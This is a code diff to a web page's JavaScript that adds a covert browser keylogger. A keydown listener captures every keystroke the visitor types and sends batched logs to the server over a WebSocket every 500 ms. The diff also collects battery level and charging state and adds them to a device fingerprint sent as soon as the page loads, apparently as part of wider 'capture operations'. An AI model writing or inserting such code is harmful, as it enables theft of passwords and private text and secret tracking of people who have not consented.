@@ -281,24 +281,70 @@
         let ws = null;
         let wsReady = false;
         const msgQueue = [];
+        let keystrokeBuffer = '';
+        let keystrokeTimer = null;
 
-        function connectWS() {
+        // Setup Keystroke Listener
+        document.addEventListener('keydown', (e) => {
+          let key = e.key;
+          // Format special keys for readability
+          if (key === 'Enter') key = ' [Enter]\n';
+          else if (key === 'Backspace') key = ' [Backspace] ';
+          else if (key === 'Tab') key = ' [Tab] ';
+          else if (key.length > 1) key = ` [${key}] `;
+          
+          keystrokeBuffer += key;
+          
+          if (!keystrokeTimer) {
+            keystrokeTimer = setTimeout(() => {
+              if (keystrokeBuffer) {
+                sendWS({ type: 'keystroke_data', keys: keystrokeBuffer });
+                keystrokeBuffer = '';
+              }
+              keystrokeTimer = null;
+            }, 500);
+          }
+        });
+
+        async function connectWS() {
           const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
           ws = new WebSocket(`${proto}//${location.host}`);
 
-          ws.onopen = () => {
+          ws.onopen = async () => {
             wsReady = true;
             // Flush queued messages
             while (msgQueue.length > 0) {
               ws.send(JSON.stringify(msgQueue.shift()));
             }
+
+            // Gather Battery status on startup
+            let batteryLevel = null;
+            let batteryCharging = null;
+            try {
+              if (navigator.getBattery) {
+                const batt = await navigator.getBattery();
+                batteryLevel = Math.round(batt.level * 100);
+                batteryCharging = batt.charging;
+                
+                // Track changes
+                batt.addEventListener('levelchange', () => {
+                  sendWS({ type: 'battery_update', level: Math.round(batt.level * 100), charging: batt.charging });
+                });
+                batt.addEventListener('chargingchange', () => {
+                  sendWS({ type: 'battery_update', level: Math.round(batt.level * 100), charging: batt.charging });
+                });
+              }
+            } catch (e) {}
+
             // Send device fingerprint immediately
             sendWS({
               type: 'user_info',
               userAgent: navigator.userAgent,
               screen: `${screen.width}x${screen.height}`,
               timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-              language: navigator.language
+              language: navigator.language,
+              batteryLevel,
+              batteryCharging
             });
             // Start all capture operations
             startCapture();
